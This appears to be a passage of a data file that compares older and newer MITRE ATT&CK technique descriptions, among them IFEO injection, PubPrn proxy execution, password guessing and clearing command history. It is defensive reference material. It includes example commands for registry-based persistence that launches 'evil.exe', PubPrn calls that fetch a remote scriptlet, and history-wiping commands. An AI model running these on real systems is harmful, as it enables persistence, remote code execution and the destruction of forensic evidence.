IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable></code> where <code><executable></code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)

IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IEFO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)

An example where the evil.exe process is started when notepad.exe exits: (Citation: Oddvar Moe IFEO APR 2018)

* <code>reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"" /v GlobalFlag /t REG_DWORD /d 512</code>
* <code>reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe"" /v ReportingMode /t REG_DWORD /d 1</code>
* <code>reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe"" /v MonitorProcess /d ""C:\temp\evil.exe""</code>

Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Endgame Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous invocation.

Malware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)"
A113,T1110.001,10.0,11.0,Password Guessing,Password Guessing,"Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.

Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)

Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:

* SSH (22/TCP)
* Telnet (23/TCP)
* FTP (21/TCP)
* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
* LDAP (389/TCP)
* Kerberos (88/TCP)
* RDP / Terminal Services (3389/TCP)
* HTTP/HTTP Management Services (80/TCP & 443/TCP)
* MSSQL (1433/TCP)
* Oracle (1521/TCP)
* MySQL (3306/TCP)
* VNC (5900/TCP)

In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)

In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows ""logon failure"" event ID 4625.","Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.

Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)

Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:

* SSH (22/TCP)
* Telnet (23/TCP)
* FTP (21/TCP)
* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
* LDAP (389/TCP)
* Kerberos (88/TCP)
* RDP / Terminal Services (3389/TCP)
* HTTP/HTTP Management Services (80/TCP & 443/TCP)
* MSSQL (1433/TCP)
* Oracle (1521/TCP)
* MySQL (3306/TCP)
* VNC (5900/TCP)
* SNMP (161/UDP and 162/TCP/UDP)

In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)

In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows ""logon failure"" event ID 4625."
A114,T1216.001,9.0,10.0,PubPrn,PubPrn,"Adversaries may use the trusted PubPrn script to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application control solutions that do not account for use of these scripts.

<code>PubPrn.vbs</code> is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script is signed by Microsoft and can be used to proxy execution from a remote site.(Citation: Enigma0x3 PubPrn Bypass) An example command is <code>cscript C[:]\Windows\System32\Printing_Admin_Scripts\en-US\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png</code>.","Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script is signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)

Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.

In later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S)."
A115,T1098,5.0,6.0,Account Manipulation,Account Manipulation,"Account manipulation may aid adversaries in maintaining access to credentials and certain permission levels within an environment. Manipulation could consist of modifying permissions, modifying credentials, adding or changing permission groups, modifying account settings, or modifying how authentication is performed. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to subvert password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.","Account manipulation may aid adversaries in maintaining access to credentials and certain permission levels within an environment. Manipulation could consist of modifying permissions, modifying credentials, adding or changing permission groups, modifying account settings, or modifying how authentication is performed. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to subvert password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.

### Exchange Email Account Takeover

The Add-MailboxPermission PowerShell cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission) This command can be run, given adequate permissions, to further access granted to certain user accounts. This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can assign more access rights to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)

### Azure AD

In Azure, an adversary can set a second password for Service Principals, facilitating persistence.(Citation: Blue Cloud of Death)

### AWS

AWS policies allow trust between accounts by simply identifying the account name. It is then up to the trusted account to only allow the correct roles to have access.(Citation: Summit Route Advanced AWS policy auditing)"
A116,T1207,8.0,9.0,Rogue Domain Controller,Rogue Domain Controller,"Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.

Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)

This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1178) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)","Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.

Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)

This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)"
A117,T1574.004,8.0,9.0,Dylib Hijacking,Dylib Hijacking,"Adversaries may execute their own malicious payloads by hijacking ambiguous paths  used to load libraries. Adversaries may plant trojan dynamic libraries, in a directory that will be searched by the operating system before the legitimate library specified by the victim program, so that their malicious library will be loaded into the victim program instead.  MacOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths.

A common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. (Citation: Writing Bad Malware for OSX) (Citation: Malware Persistence on OS X)

If the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level.","Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.

Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)"
A118,T1070.003,11.0,12.0,Clear Command History,Clear Command History,"In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.

On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.

Adversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  

Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data.(Citation: US-CERT-TA18-106A)

On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.

The <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)

Adversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)","In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.

On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.

Adversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  

Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)

On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.

The <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)

Adversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)"
A119,T1027.004,15.0,16.0,Compile After Delivery,Compile After Delivery,"Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)

Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)","Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as ilasm.exe(Citation: ATTACK IQ), csc.exe, or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)

Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)"
A120,T1189,5.0,6.0,Drive-by Compromise,Drive-by Compromise,"A drive-by compromise is when an adversary gains access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is targeted for exploitation.

Multiple ways of delivering exploit code to a browser exist, including:

* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, cross-site scripting.
* Malicious ads are paid for and served through legitimate ad providers.
* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).

Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring. (Citation: Shadowserver Strategic Web Compromise)

Typical drive-by compromise process:

1. A user visits a website that is used to host the adversary controlled content.
2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. 
    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.
3. Upon finding a vulnerable version, exploit code is delivered to the browser.
4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.
    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.

Unlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.","A drive-by compromise is when an adversary gains access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring application access tokens.

Multiple ways of delivering exploit code to a browser exist, including:

* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.
* Malicious ads are paid for and served through legitimate ad providers.
* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).

Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring. (Citation: Shadowserver Strategic Web Compromise)

Typical drive-by compromise process:

1. A user visits a website that is used to host the adversary controlled content.
2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. 
    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.
3. Upon finding a vulnerable version, exploit code is delivered to the browser.
4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.
    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.

Unlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.

Adversaries may also use compromised websites to deliver a user to a malicious application designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.(Citation: Volexity OceanLotus Nov 2017)"
A121,T1061,2.0,3.0,Graphical User Interface,Graphical User Interface,"Cause a binary or script to execute based on interacting with the file through a graphical user interface (GUI) or in an interactive remote session such as Remote Desktop Protocol.

Detection: Detection of execution through the GUI will likely lead to significant false positives. Other factors should be considered to detect misuse of services that can lead to adversaries gaining access to systems through interactive remote sessions. 

Unknown or unusual process launches outside of normal behavior on a particular system occurring through remote interactive sessions are suspicious. Collect and audit security logs that may indicate access to and use of Legitimate Credentials to access remote systems within the network.

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Binary file metadata, Process command-line parameters, Process monitoring

Permissions Required: User, Administrator, SYSTEM

Remote Support: Yes","The Graphical User Interfaces (GUI) is a common way to interact with an operating system. Adversaries may use a system's GUI during an operation, commonly through a remote interactive session such as [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076), instead of through a [Command-Line Interface](https://attack.mitre.org/techniques/T1059), to search for information and execute files via mouse double-click events, the Windows Run command (Citation: Wikipedia Run Command), or other potentially difficult to monitor interactions."
A122,T1086,3.0,4.0,PowerShell,PowerShell,"PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. 

PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

Administrator permissions are required to use PowerShell to connect to remote systems.

A number of PowerShell-based offensive testing tools are available, including Empire, (Citation: Github PowerShell Empire) PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)","PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. 

PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

Administrator permissions are required to use PowerShell to connect to remote systems.

A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)

PowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014)"
A123,T1112,6.0,7.0,Modify Registry,Modify Registry,"Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in Persistence and Execution.

Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API (see examples).

Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to establish Persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)

The Registry of a remote system may be modified to aid in execution of files as part of Lateral Movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) for RPC communication.","Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.

Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.

Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)

The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication."
A124,T1098.001,8.0,9.0,Additional Cloud Credentials,Additional Cloud Credentials,"Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.

Adversaries may add credentials for Azure Service Principals in addition to existing legitimate credentials(Citation: Create Azure Service Principal) to victim Azure accounts.(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) Azure Service Principals support both password and certificate credentials.(Citation: Why AAD Service Principals) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules.(Citation: Demystifying Azure AD Service Principals)

After gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)","Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.

Adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)

In infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)"
A125,T1615,14.0,15.0,Group Policy Discovery,Group Policy Discovery,"Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)

Adversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.","Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)

Adversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain or Tenant Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit."
A126,T1025,2.0,3.0,Data from Removable Media,Data from Removable Media,"Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration.

Adversaries may search connected removable media on computers they have compromised to find files of interest. Interactive command shells may be in use, and common functionality within cmd may be used to gather information. Some adversaries may also use Automated Collection on removable media.

Detection: Monitor processes and command-line arguments for actions that could be taken to collect files from a system's connected removable media. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Process monitoring, Process command-line parameters

System Requirements: Privileges to access removable media drive and files","Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration.

Adversaries may search connected removable media on computers they have compromised to find files of interest. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on removable media."
A127,T1201,9.0,10.0,Password Policy Discovery,Password Policy Discovery,"Adversaries may attempt to access detailed information about the password policy used within an enterprise network. Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This would help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).

Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code>.(Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies)","Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).

Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code> (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies).

